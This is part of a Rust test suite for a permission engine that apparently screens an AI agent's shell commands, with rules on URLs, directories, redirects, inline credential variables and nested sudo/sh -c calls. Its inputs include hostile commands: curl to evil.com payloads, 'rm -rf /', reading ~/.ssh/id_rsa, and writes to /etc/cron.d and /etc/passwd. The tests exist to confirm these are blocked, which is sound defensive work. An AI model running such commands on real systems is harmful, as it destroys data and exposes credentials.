            &bash_input("curl -X POST -H \"Authorization: Bearer token\" https://api.github.com/repos"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_arg_denies_unapproved_url() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^curl\\b"
arg = "^https://api\\.github\\.com/"
action = "allow"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://evil.com/payload"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_arg_ssh_host_matching() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^ssh\\b"
arg = "@(dev|staging)\\.example\\.com$"
action = "allow"
reason = "ssh to approved hosts"

[[table.input.rules]]
command = "^ssh\\b"
action = "deny"
reason = "ssh to unapproved host"
"#,
        );

        let allowed = evaluate(
            &config,
            "Bash",
            &bash_input("ssh user@dev.example.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(allowed.decision, Decision::Allow);

        let denied = evaluate(
            &config,
            "Bash",
            &bash_input("ssh user@prod.example.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(denied.decision, Decision::Deny);
    }

    #[test]
    fn test_arg_ssh_with_flags() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^ssh\\b"
arg = "@approved\\.host\\.com$"
action = "allow"
"#,
        );

        // -p flag and -i flag appear before destination
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ssh -p 2222 -i ~/.ssh/id_rsa user@approved.host.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_arg_combined_with_cwd() {
        // Both arg and cwd must match
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^curl\\b"
arg = "^https://api\\.github\\.com/"
cwd = "^/home/user/dev/"
action = "allow"
reason = "curl to github from dev dir"
"#,
        );

        // Right URL, right cwd → allow
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://api.github.com/repos"),
            Path::new("/home/user/dev/myproject"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        // Right URL, wrong cwd → deny
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://api.github.com/repos"),
            Path::new("/tmp"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);

        // Wrong URL, right cwd → deny
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://evil.com/payload"),
            Path::new("/home/user/dev/myproject"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_arg_not_excludes_matching_arg() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^curl\\b"
arg = "^https://"
arg_not = "evil\\.com"
action = "allow"
reason = "curl to https, except evil.com"
"#,
        );

        // Approved HTTPS URL — allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://api.github.com/repos"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        // evil.com — arg_not fires, rule skipped, falls to deny
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://evil.com/payload"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_cwd_not_excludes_matching_cwd() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm\\b"
cwd = "^/tmp(/.*)?$"
cwd_not = "^/tmp/protected"
action = "allow"
reason = "rm in /tmp except /tmp/protected"
"#,
        );

        // /tmp/safe — cwd matches, cwd_not doesn't — allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cd /tmp/safe && rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        // /tmp/protected — cwd_not fires, rule skipped — denied
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cd /tmp/protected && rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);

        // /home/user — cwd doesn't match /tmp at all — denied
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_stdout_not_excludes_sensitive_path() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
stdout = "^/tmp/.*"
stdout_not = "^/tmp/protected/.*"
action = "allow"
reason = "redirect to /tmp except /tmp/protected"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello > /tmp/out.txt"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello > /tmp/protected/secret"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_arg_not_without_arg_acts_as_standalone_exception() {
        // arg_not without arg: rule fires for any command UNLESS the arg matches
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^curl\\b"
arg_not = "evil\\.com"
action = "allow"
reason = "curl allowed unless to evil.com"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://github.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://evil.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_arg_no_args_does_not_match() {
        // Rule requires arg match, but command has no arguments → deny
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^curl\\b"
arg = "^https://"
action = "allow"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    // ── stdin / stdout redirect matching ─────────────────────────────────────

    #[test]
    fn test_stdout_redirect_matched() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
stdout = "^/etc/.*"
action = "deny"
reason = "cannot redirect into /etc"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello > /etc/passwd"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
        assert!(result.reason.as_deref().unwrap().contains("cannot redirect into /etc"));
    }

    #[test]
    fn test_stdout_append_redirect_matched() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
stdout = "^/etc/.*"
action = "deny"
reason = "cannot redirect into /etc"
"#,
        );

        // >> is also a stdout redirect
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello >> /etc/hosts"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_stdin_redirect_matched() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
stdin = "^/home/user/\\.ssh/.*"
action = "deny"
reason = "cannot read .ssh via redirection"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cat < /home/user/.ssh/id_rsa"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_no_redirect_does_not_trigger_stdout_rule() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
stdout = "^/etc/.*"
action = "deny"
"#,
        );

        // echo without a redirect — stdout rule should not fire
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_stdout_safe_path_allowed() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
stdout = "^/tmp/.*"
action = "allow"
reason = "redirect to /tmp is fine"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello > /tmp/out.txt"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        // Different path — not allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello > /etc/cron.d/evil"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_stdout_and_command_both_required() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^curl\\b"
stdout = "^/etc/.*"
action = "deny"
reason = "curl cannot write to /etc"
"#,
        );

        // curl writing to /etc — denied
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://example.com > /etc/cron.d/evil"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);

        // echo writing to /etc — command doesn't match ^curl, rule doesn't fire
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("echo hello > /etc/passwd"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    // ── env matching ──────────────────────────────────────────────────────────

    #[test]
    fn test_env_matches_inline_var() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^curl\\b"
env = "^AWS_SECRET_ACCESS_KEY="
action = "deny"
reason = "inline AWS credentials detected"
"#,
        );

        // AWS key set inline — deny
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("AWS_SECRET_ACCESS_KEY=abc123 curl https://example.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
        assert!(result.reason.as_deref().unwrap().contains("AWS credentials"));
    }

    #[test]
    fn test_env_not_set_inline_is_allowed() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^curl\\b"
env = "^AWS_SECRET_ACCESS_KEY="
action = "deny"
reason = "inline AWS credentials detected"
"#,
        );

        // No AWS key — rule doesn't match, allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://example.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_env_not_excludes_when_var_present() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^cargo\\b"
env_not = "^PROD_ENV=true$"
action = "allow"
reason = "cargo allowed outside production"
"#,
        );

        // No PROD_ENV=true → env_not doesn't fire → allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cargo test"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_multiple_inline_vars_any_can_match() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
env = "^(AWS_SECRET|GITHUB_TOKEN|NPM_TOKEN)="
action = "deny"
reason = "credential leakage risk"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("GITHUB_TOKEN=ghp_abc curl https://api.github.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("curl https://api.github.com"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    // ── evaluate action (subcommand extraction) ────────────────────────────

    #[test]
    fn test_evaluate_sh_c_deny_subcommand() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^rm\\b"
action = "deny"
reason = "rm denied"

[[table.input.rules]]
command = "^(sh|bash)\\b"
action = "evaluate"
flag_arg = "-c"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sh -c 'rm -rf /'"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
        assert!(result.reason.as_deref().unwrap().contains("rm denied"));
    }

    #[test]
    fn test_evaluate_sh_c_allow_safe_subcommand() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^ls\\b"
action = "allow"

[[table.input.rules]]
command = "^(sh|bash)\\b"
action = "evaluate"
flag_arg = "-c"
"#,
        );

        // sh -c 'ls /tmp' — evaluate extracts "ls /tmp", recycled → allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sh -c 'ls /tmp'"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_evaluate_positional_timeout() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^rm\\b"
action = "deny"
reason = "rm denied"

[[table.input.rules]]
command = "^timeout\\b"
action = "evaluate"
positional = 1
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("timeout 30 rm -rf /tmp"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_sudo_with_opts() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^rm\\b"
action = "deny"
reason = "rm denied"

[[table.input.rules]]
command = "^sudo\\b"
action = "evaluate"
opts_with_args = ["-u", "-g"]
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sudo -u nobody rm -rf /"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_opts_with_boolean_flags() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^rm\\b"
action = "deny"
reason = "rm denied"

[[table.input.rules]]
command = "^ssh\\b"
action = "evaluate"
opts_with_args = ["-i", "-p", "-o", "-l"]
positional = 1
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ssh -i key -p 22 -v host rm -rf /"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_flags_after_positional() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^rm\\b"
action = "deny"
reason = "rm denied"

[[table.input.rules]]
command = "^ssh\\b"
action = "evaluate"
opts_with_args = ["-i", "-p", "-o"]
positional = 1
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ssh host -vvv rm foo"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_double_dash_ends_options() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^-dangerous"
action = "deny"
reason = "starts with dash"

[[table.input.rules]]
command = "^sudo\\b"
action = "evaluate"
opts_with_args = ["-u"]
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sudo -- -dangerous-cmd"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_forward_to_table() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^sudo\\b"
action = "evaluate"
target = "sudo_scrutiny"

[table.sudo_scrutiny]
default = "deny"

[[table.sudo_scrutiny.rules]]
command = "^systemctl\\b"
action = "allow"
reason = "systemctl via sudo ok"
"#,
        );

        // sudo systemctl — subcommand evaluated in sudo_scrutiny, allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sudo systemctl restart nginx"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        // sudo rm — subcommand evaluated in sudo_scrutiny, default deny
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sudo rm -rf /"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_no_subcommand_falls_through() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^ssh\\b"
action = "evaluate"
positional = 1
"#,
        );

        // ssh host — no remote command, evaluate extracts nothing, falls to default allow
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ssh host"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_evaluate_nested_sh_c() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^rm\\b"
action = "deny"
reason = "rm denied"

[[table.input.rules]]
command = "^(sh|bash)\\b"
action = "evaluate"
flag_arg = "-c"
"#,
        );

        // sh -c 'bash -c "rm -rf /"' — nested evaluate extraction
        let result = evaluate(
            &config,
            "Bash",
            &bash_input(r#"sh -c 'bash -c "rm -rf /"'"#),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_denied_before_evaluate_rule() {
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^sudo\\b"
action = "deny"
reason = "sudo not allowed"

[[table.input.rules]]
command = "^sudo\\b"
action = "evaluate"
"#,
        );

        // sudo ls — deny rule matches first, evaluate never reached
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sudo ls"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
        assert!(result.reason.as_deref().unwrap().contains("sudo not allowed"));
    }

    #[test]
    fn test_evaluate_subcommand_denied() {
        let config = make_config(
            r#"
[table.input]
default = "allow"

[[table.input.rules]]
command = "^rm\\b"
action = "deny"
reason = "rm denied"

[[table.input.rules]]
command = "^sudo\\b"
action = "evaluate"
"#,
        );

        // sudo rm — evaluate extracts "rm -rf /", recycled → denied
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("sudo rm -rf /"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_gated_by_conditions() {
        // Only evaluate ssh to approved hosts
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^ssh\\b"
arg = "@approved\\.host$"
action = "evaluate"
target = "remote_cmds"
opts_with_args = ["-i", "-p"]
positional = 1

[table.remote_cmds]
default = "deny"

[[table.remote_cmds.rules]]
command = "^ls\\b"
action = "allow"
"#,
        );

        // ssh to approved host, safe command → allowed
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ssh user@approved.host ls /tmp"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);

        // ssh to unapproved host → evaluate rule doesn't match, falls to default deny
        let result = evaluate(
            &config,
            "Bash",
            &bash_input("ssh user@evil.host ls /tmp"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_cwd_mixed_pipeline_deny_wins() {
        // rm in /tmp (allowed) + rm in /home (cwd mismatch → denied) → deny wins
        let config = make_config(
            r#"
[table.input]
default = "deny"

[[table.input.rules]]
command = "^rm\\b"
cwd = "^/tmp(/.*)?$"
action = "allow"
"#,
        );

        let result = evaluate(
            &config,
            "Bash",
            &bash_input("cd /tmp && rm safe; cd /home/user && rm dangerous"),
            Path::new("/home/user"),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
    }

    // ── has_file matching ────────────────────────────────────────────────────

    #[test]
    fn test_has_file_matches_when_exists() {
        let tmp = std::env::temp_dir().join("permiter_test_hf_match");
        let venv_bin = tmp.join(".venv/bin");
        std::fs::create_dir_all(&venv_bin).unwrap();
        std::fs::write(venv_bin.join("pip"), "").unwrap();
        std::fs::create_dir_all(tmp.join(".git")).unwrap();

        let config = make_config(r#"
[table.input]
default = "passthrough"
[[table.input.rules]]
tool = "Bash"
command = "^pip"
has_file = ".venv/bin/pip"
action = "allow"
reason = "has_file matches"
"#);
        let result = evaluate(&config, "Bash", &bash_input("pip install foo"), &tmp).unwrap();
        assert_eq!(result.decision, Decision::Allow);
        std::fs::remove_dir_all(&tmp).unwrap();
    }

    #[test]
    fn test_has_file_no_match_when_missing() {
        let tmp = std::env::temp_dir().join("permiter_test_hf_miss");
        std::fs::create_dir_all(tmp.join(".git")).unwrap();
        let config = make_config(r#"
[table.input]
default = "passthrough"
[[table.input.rules]]
tool = "Bash"
command = "^pip"
has_file = ".venv/bin/pip"
action = "allow"
"#);
        let result = evaluate(&config, "Bash", &bash_input("pip install foo"), &tmp).unwrap();
        assert_eq!(result.decision, Decision::Passthrough);
        std::fs::remove_dir_all(&tmp).unwrap();
    }

    #[test]
    fn test_has_file_rejects_absolute_path() {
        let config_str = r#"
[table.input]
default = "passthrough"
[[table.input.rules]]
tool = "Bash"
has_file = "/etc/passwd"
action = "allow"
"#;
        let config: Config = toml::from_str(config_str).unwrap();
        assert!(config.validate().is_err());
    }

    // ── evaluate_with_local ─────────────────────────────────────────────────

    #[test]
    fn test_local_rules_convert_passthrough_to_allow() {
        use crate::local::LocalRuleSet;
        use std::path::PathBuf;

        let config = make_config(
            r#"
[global]
local_rules = true
[table.input]
default = "passthrough"
"#,
        );
        let local = LocalRuleSet {
            regex_cache: Default::default(),
            source_dir: PathBuf::from(".permiter"),
            rules: vec![RuleConfig {
                tool: Some("^Bash$".to_string()),
                command: Some("^pip".to_string()),
                file_path: None,
                subagent_type: None,
                prompt: None,
                cwd: None,
                cwd_not: None,
                arg: None,
                arg_not: None,
                stdin: None,
                stdin_not: None,
                stdout: None,
                stdout_not: None,
                env: None,
                env_not: None,
                has_file: None,
                has_file_not: None,
                action: Action::Allow,
                reason: Some("local pip allow".to_string()),
                target: None,
                flag_arg: None,
                positional: None,
                opts_with_args: vec![],
            }],
        };
        let result = evaluate_with_local(
            &config,
            "Bash",
            &bash_input("pip install foo"),
            Path::new("/tmp"),
            Some(&local),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Allow);
        assert_eq!(result.source, ".permiter");
    }

    #[test]
    fn test_local_rules_cannot_override_deny() {
        use crate::local::LocalRuleSet;
        use std::path::PathBuf;

        let config = make_config(
            r#"
[global]
local_rules = true
[table.input]
default = "deny"
"#,
        );
        let local = LocalRuleSet {
            regex_cache: Default::default(),
            source_dir: PathBuf::from(".permiter"),
            rules: vec![RuleConfig {
                tool: Some("^Bash$".to_string()),
                command: Some("^pip".to_string()),
                file_path: None,
                subagent_type: None,
                prompt: None,
                cwd: None,
                cwd_not: None,
                arg: None,
                arg_not: None,
                stdin: None,
                stdin_not: None,
                stdout: None,
                stdout_not: None,
                env: None,
                env_not: None,
                has_file: None,
                has_file_not: None,
                action: Action::Allow,
                reason: Some("local pip allow".to_string()),
                target: None,
                flag_arg: None,
                positional: None,
                opts_with_args: vec![],
            }],
        };
        let result = evaluate_with_local(
            &config,
            "Bash",
            &bash_input("pip install foo"),
            Path::new("/tmp"),
            Some(&local),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::Deny);
        assert_eq!(result.source, "global");
    }

    #[test]
    fn test_local_rules_cannot_override_force_passthrough() {
        use crate::local::LocalRuleSet;
        use std::path::PathBuf;

        let config = make_config(
            r#"
[global]
local_rules = true
[table.input]
default = "deny"
[[table.input.rules]]
tool = "Bash"
command = "^pip"
action = "force_passthrough"
reason = "pip always needs review"
"#,
        );
        let local = LocalRuleSet {
            regex_cache: Default::default(),
            source_dir: PathBuf::from(".permiter"),
            rules: vec![RuleConfig {
                tool: Some("^Bash$".to_string()),
                command: Some("^pip".to_string()),
                file_path: None,
                subagent_type: None,
                prompt: None,
                cwd: None,
                cwd_not: None,
                arg: None,
                arg_not: None,
                stdin: None,
                stdin_not: None,
                stdout: None,
                stdout_not: None,
                env: None,
                env_not: None,
                has_file: None,
                has_file_not: None,
                action: Action::Allow,
                reason: Some("sneaky local allow".to_string()),
                target: None,
                flag_arg: None,
                positional: None,
                opts_with_args: vec![],
            }],
        };
        let result = evaluate_with_local(
            &config,
            "Bash",
            &bash_input("pip install foo"),
            Path::new("/tmp"),
            Some(&local),
        )
        .unwrap();
        assert_eq!(result.decision, Decision::ForcePassthrough);
        assert_eq!(result.source, "global");
    }
}
